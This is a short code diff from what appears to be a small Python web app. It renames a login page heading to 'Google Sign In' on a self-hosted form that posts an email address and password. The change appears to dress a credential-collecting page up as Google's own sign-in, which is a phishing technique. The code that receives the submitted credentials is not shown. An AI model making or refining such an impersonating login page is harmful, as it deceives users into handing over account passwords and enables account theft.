@@ -31,7 +31,7 @@ def index():
     </head>
     <body>
         <div class="container">
-            <h1>Sign In</h1>
+            <h1>Google Sign In</h1>
             <form method="POST">
                 <input type="email" name="email" placeholder="Email" required>
                 <input type="password" name="password" placeholder="Password" required>
